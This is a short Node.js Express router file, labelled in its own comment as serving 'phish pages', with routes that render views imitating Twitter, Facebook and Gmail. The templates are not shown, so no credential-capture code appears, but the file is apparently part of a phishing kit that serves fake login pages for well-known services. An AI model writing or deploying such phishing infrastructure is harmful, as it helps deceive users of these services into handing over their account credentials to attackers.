var express = require('express');
var router = express.Router();

/* GET phish pages. */
router.get('/', function(req, res, next) {
  res.render('twitter') // twitter
});
router.get('/facebook', function(req, res, next) {
  res.render('facebook') // facebook
});
router.get('/gmail', function(req, res, next) {
  res.render('gmail') // facebook
});
module.exports = router;
